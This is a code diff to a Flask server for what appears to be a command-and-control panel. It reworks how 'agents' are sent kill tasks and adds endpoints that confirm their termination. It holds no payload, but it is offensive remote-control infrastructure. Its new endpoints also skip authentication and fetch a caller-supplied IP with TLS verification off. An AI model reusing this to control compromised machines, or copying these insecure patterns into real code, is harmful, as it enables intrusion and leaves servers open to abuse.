@@ -781,6 +781,8 @@ def init_api_routes(app, socketio):
                 "status": "error",
                 "message": str(e)
             }), 500
+        
+
     @app.route('/api/kill_agent', methods=['POST'])
     @login_required
     def kill_agent():
@@ -795,10 +797,12 @@ def init_api_routes(app, socketio):
             conn = sqlite3.connect(CONFIG.database)
             c = conn.cursor()
             
-            # Create a kill task for the agent
+            # Create a kill task that will force immediate termination
             task_data = {
-                'kill': True,
-                'message': 'Kill command received from C2'
+                'force': True,
+                'immediate': True,
+                'method': 'kill_process',
+                'retries': 3  # Number of times to retry killing
             }
             
             c.execute("INSERT INTO tasks VALUES (?, ?, ?, ?, ?, ?, ?)",
@@ -810,13 +814,13 @@ def init_api_routes(app, socketio):
             
             conn.commit()
             task_id = c.lastrowid
-            conn.close()
             
-            # Notify agent via websocket
-            socketio.emit('new_task', {
-                'task_id': task_id,
+            # Don't mark as dead immediately - wait for confirmation
+            socketio.emit('agent_kill_initiated', {
                 'agent_id': agent_id,
-                'task_type': 'kill'
+                'task_id': task_id,
+                'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z'),
+                'message': 'Kill command sent to agent'
             })
             
             return jsonify({
@@ -828,8 +832,108 @@ def init_api_routes(app, socketio):
         except Exception as e:
             if conn:
                 conn.rollback()
-                conn.close()
             return jsonify({
                 "status": "error",
                 "message": str(e)
             }), 500
+        finally:
+            if conn:
+                conn.close()
+
+    @app.route('/api/agent_terminated', methods=['POST'])
+    def agent_terminated():
+        conn = None
+        try:
+            if not request.data:
+                return jsonify({"status": "error", "message": "No data provided"}), 400
+                
+            data = SecureComms.decrypt(request.data)
+            agent_id = data.get('agent_id')
+            
+            if not agent_id:
+                return jsonify({"status": "error", "message": "Agent ID required"}), 400
+            
+            conn = sqlite3.connect(CONFIG.database)
+            c = conn.cursor()
+            
+            # Confirm agent termination
+            c.execute("UPDATE agents SET status='dead', last_seen=? WHERE id=?",
+                    (data.get('timestamp'), agent_id))
+            
+            conn.commit()
+            
+            # Notify clients
+            socketio.emit('agent_terminated', {
+                'agent_id': agent_id,
+                'timestamp': data.get('timestamp'),
+                'message': 'Agent confirmed terminated'
+            })
+            
+            return jsonify({"status": "success"})
+            
+        except Exception as e:
+            if conn:
+                conn.rollback()
+            return jsonify({
+                "status": "error",
+                "message": str(e)
+            }), 500
+        finally:
+            if conn:
+                conn.close()
+
+    @app.route('/api/verify_termination', methods=['POST'])
+    def verify_termination():
+        try:
+            if not request.data:
+                return jsonify({"status": "error", "message": "No data provided"}), 400
+                
+            data = SecureComms.decrypt(request.data)
+            agent_id = data.get('agent_id')
+            
+            if not agent_id:
+                return jsonify({"status": "error", "message": "Agent ID required"}), 400
+            
+            # Try to ping the agent
+            try:
+                response = requests.post(
+                    f"https://{data.get('last_known_ip')}/api/ping",
+                    timeout=5,
+                    verify=False
+                )
+                if response.status_code == 200:
+                    return jsonify({
+                        "status": "error",
+                        "message": "Agent still responding",
+                        "alive": True
+                    })
+            except:
+                pass
+            
+            # If we get here, agent appears dead
+            conn = sqlite3.connect(CONFIG.database)
+            c = conn.cursor()
+            
+            c.execute("UPDATE agents SET status='dead' WHERE id=?", (agent_id,))
+            conn.commit()
+            
+            socketio.emit('agent_confirmed_dead', {
+                'agent_id': agent_id,
+                'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z'),
+                'message': 'Agent termination confirmed'
+            })
+            
+            return jsonify({
+                "status": "success",
+                "alive": False,
+                "message": "Agent termination confirmed"
+            })
+            
+        except Exception as e:
+            return jsonify({
+                "status": "error",
+                "message": str(e)
+            }), 500
+        finally:
+            if 'conn' in locals():
+                conn.close()
